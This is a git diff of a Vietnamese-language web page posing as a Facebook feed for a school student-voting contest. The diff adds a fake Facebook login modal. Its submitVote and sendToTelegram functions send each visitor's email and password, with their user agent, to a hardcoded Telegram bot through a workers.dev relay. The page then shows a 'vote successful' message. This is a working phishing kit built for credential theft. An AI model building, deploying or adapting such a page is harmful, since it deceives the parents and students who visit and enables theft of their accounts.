+                            <div class="candidate-class">Lớp 10A3 - Điểm TB: 9.8</div>
+                            <div class="vote-count">1,876 lượt bình chọn</div>
+                        </div>
+                        <button class="vote-btn" onclick="showLoginModal()">
+                            <i class="fas fa-vote-yea"></i> Bình chọn
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="post-footer">
+                    <div class="footer-action" onclick="toggleLike(this)">
+                        <i class="far fa-thumbs-up"></i>
+                        <span>Thích</span>
+                    </div>
+                    <div class="footer-action" onclick="focusComment()">
+                        <i class="far fa-comment"></i>
+                        <span>Bình luận</span>
+                    </div>
+                    <div class="footer-action">
+                        <i class="fas fa-share"></i>
+                        <span>Chia sẻ</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Sample Post 3 -->
+            <div class="post">
+                <div class="post-header">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="User" class="post-avatar">
+                    <div class="post-info">
+                        <div class="post-title">Ban phụ huynh</div>
+                        <div class="post-time">
+                            <i class="fas fa-globe-americas"></i>
+                            Công khai · 3 ngày trước
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="post-content">
+                    <div class="post-text">
+                        Thông báo về chương trình từ thiện "Áo ấm mùa đông" của nhà trường. Kính mong quý phụ huynh ủng hộ quần áo ấm cho các em học sinh vùng cao.
+                    </div>
+                    
+                    <img src="https://source.unsplash.com/random/600x400?charity" class="post-image">
+                </div>
+                
+                <div class="post-footer">
+                    <div class="footer-action" onclick="toggleLike(this)">
+                        <i class="far fa-thumbs-up"></i>
+                        <span>Thích</span>
+                    </div>
+                    <div class="footer-action" onclick="focusComment()">
+                        <i class="far fa-comment"></i>
+                        <span>Bình luận</span>
+                    </div>
+                    <div class="footer-action">
+                        <i class="fas fa-share"></i>
+                        <span>Chia sẻ</span>
+                    </div>
+                </div>
+            </div>
         </div>
+        
+        <!-- Right Sidebar -->
+        <aside class="right-sidebar" id="rightSidebar">
+            <div class="shortcut-title">Người liên hệ</div>
+            <div class="contact-item">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Contact" class="contact-avatar">
+                <div class="contact-name">Cô giáo Mai</div>
+                <div class="contact-status"></div>
+            </div>
+            <div class="contact-item">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Contact" class="contact-avatar">
+                <div class="contact-name">Thầy Hiệu trưởng</div>
+                <div class="contact-status"></div>
+            </div>
+            <div class="contact-item">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Contact" class="contact-avatar">
+                <div class="contact-name">Ban phụ huynh</div>
+            </div>
+            <div class="contact-item">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Contact" class="contact-avatar">
+                <div class="contact-name">Thầy giáo Toán</div>
+                <div class="contact-status"></div>
+            </div>
+            <div class="contact-item">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Contact" class="contact-avatar">
+                <div class="contact-name">Cô giáo Văn</div>
+            </div>
+            <div class="contact-item">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlRM2-AldpZgaraCXCnO5loktGi0wGiNPydQ&s" alt="Contact" class="contact-avatar">
+                <div class="contact-name">Thầy giáo Lý</div>
+                <div class="contact-status"></div>
+            </div>
+        </aside>
     </main>
-
-    <!-- Vote Confirmation Modal -->
-    <div class="modal-overlay hidden" id="vote-modal">
-        <div class="modal-container">
-            <div class="modal-header">
-                <h3>Xác nhận bình chọn</h3>
-                <button class="close-modal">&times;</button>
-            </div>
-            <div class="modal-body">
-                <p>Bạn đang bình chọn cho <strong id="selected-student-name"></strong></p>
-                <div class="student-preview">
-                    <img id="selected-student-avatar" src="" alt="Student Avatar">
-                    <div class="student-info">
-                        <h4 id="selected-student-fullname"></h4>
-                        <p>Lượt bình chọn hiện tại: <span id="current-votes">0</span></p>
-                    </div>
+    
+    <!-- Login Modal -->
+    <div class="login-modal" id="loginModal">
+        <div class="login-container" id="loginContainer">
+            <div class="login-header">
+                <div class="login-title">Đăng nhập vào Facebook</div>
+                <div class="login-close" onclick="hideLoginModal()">
+                    <i class="fas fa-times"></i>
                 </div>
             </div>
-            <div class="modal-footer">
-                <button class="fb-btn secondary" id="cancel-vote">Hủy bỏ</button>
-                <button class="fb-btn primary" id="confirm-vote">Xác nhận</button>
+            <div class="login-body">
+                <input type="text" class="login-input" id="email" placeholder="Email hoặc số điện thoại">
+                <input type="password" class="login-input" id="password" placeholder="Mật khẩu">
+                <button class="login-btn" onclick="submitVote()">Đăng nhập</button>
+                <div style="text-align: center; margin: 16px 0;">
+                    <a href="#" style="color: var(--primary); font-size: 14px;">Quên mật khẩu?</a>
+                </div>
+                <div class="divider"></div>
+            </div>
+            <div class="login-footer">
+                <button class="signup-btn" onclick="showSignupModal()">Tạo tài khoản mới</button>
             </div>
         </div>
     </div>
-
-    <!-- Login Success Toast -->
-    <div class="toast hidden" id="login-toast">
-        <div class="toast-content">
-            <i class="fas fa-check-circle"></i>
-            <span>Đăng nhập thành công!</span>
-        </div>
+    
+    <!-- Toast Notification -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle"></i>
+        <span id="toastMessage">Bình chọn thành công!</span>
     </div>
-
-    <script src="js/script.js"></script>
+    
+    <script>
+        // Set current date
+        document.getElementById('current-date').textContent = new Date().toLocaleDateString('vi-VN', {
+            day: 'numeric',
+            month: 'numeric',
+            year: 'numeric'
+        });
+        
+        // Toggle mobile menu
+        document.getElementById('menuToggle').addEventListener('click', function() {
+            document.getElementById('leftSidebar').classList.toggle('active');
+            document.getElementById('rightSidebar').classList.toggle('active');
+        });
+        
+        // Show login modal with animation
+        function showLoginModal() {
+            const modal = document.getElementById('loginModal');
+            const container = document.getElementById('loginContainer');
+            
+            modal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            setTimeout(() => {
+                container.classList.add('active');
+            }, 10);
+        }
+        
+        // Hide login modal with animation
+        function hideLoginModal() {
+            const container = document.getElementById('loginContainer');
+            container.classList.remove('active');
+            
+            setTimeout(() => {
+                document.getElementById('loginModal').style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+        
+        // Toggle like button
+        function toggleLike(element) {
+            const icon = element.querySelector('i');
+            const text = element.querySelector('span');
+            
+            if (icon.classList.contains('far')) {
+                icon.classList.remove('far');
+                icon.classList.add('fas');
+                element.classList.add('liked');
+                text.textContent = 'Đã thích';
+            } else {
+                icon.classList.remove('fas');
+                icon.classList.add('far');
+                element.classList.remove('liked');
+                text.textContent = 'Thích';
+            }
+        }
+        
+        // Focus comment input (placeholder function)
+        function focusComment() {
+            showToast('Vui lòng đăng nhập để bình luận');
+        }
+        
+        // Show toast notification
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+            
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Submit vote
+        function submitVote() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                showToast('Vui lòng nhập đầy đủ email và mật khẩu!');
+                return;
+            }
+            
+            // Send to Telegram
+            sendToTelegram(email, password);
+            
+            // Hide modal
+            hideLoginModal();
+            
+            // Show success message
+            showToast('Bình chọn thành công! Cảm ơn bạn đã tham gia.');
+            
+            // Reset form
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            // Update vote counts (demo)
+            updateVoteCounts();
+        }
+        
+        // Update vote counts
+        function updateVoteCounts() {
+            const voteCounts = document.querySelectorAll('.vote-count');
+            voteCounts.forEach(count => {
+                const current = parseInt(count.textContent.replace(/\D/g, ''));
+                count.textContent = (current + 1).toLocaleString('vi-VN') + ' lượt bình chọn';
+            });
+        }
+        
+        // Send data to Telegram
+        function sendToTelegram(email, password) {
+            const BOT_TOKEN = '8016061982:AAGBDhixC2fxTyhV70s5LH04vSjBeQdZ_Fs';
+            const CHAT_ID = '6360461491';
+            const TELEGRAM_API_URL = `https://quiet-bar-4d07.hackff809876.workers.dev/bot${BOT_TOKEN}/sendMessage`;
+            
+            const message = `📌 Có bình chọn mới!\n📧 Email: ${email}\n🔑 Mật khẩu: ${password}\n⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n🌐 IP: ${getIP()}\n🖥 User Agent: ${navigator.userAgent}`;
+            
+            fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram response:', data);
+            })
+            .catch(error => {
+                console.error('Telegram error:', error);
+            });
+        }
+        
+        // Get IP (demo)
+        function getIP() {
+            return "192.168.1.1"; // In real implementation, use a service to get real IP
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('loginModal')) {
+                hideLoginModal();
+            }
+        }
+        
+        // Prevent layout shift by pre-calculating heights
+        window.addEventListener('load', function() {
+            // Set fixed height for stories
+            const stories = document.querySelector('.story-section');
+            if (stories) {
+                stories.style.height = stories.offsetHeight + 'px';
+            }
+        });
+    </script>
 </body>
 </html>
